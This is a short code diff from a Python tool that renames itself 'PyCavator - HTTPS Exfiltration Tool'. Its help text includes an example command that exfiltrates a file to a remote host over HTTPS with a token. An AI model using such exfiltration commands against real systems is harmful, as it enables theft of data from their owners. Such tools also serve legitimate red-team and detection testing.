@@ -58,7 +58,7 @@ def send_data_https(args):
 def main():
     # Parse command line arguments
     parser = argparse.ArgumentParser(
-        description='Send and receive data using HTTPS packets.',
+        description='PyCavator - HTTPS Exfiltration Tool',
         epilog='''Examples:
   # Sender mode: exfiltrate data from a file
   python pycavator-httpsender.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..."
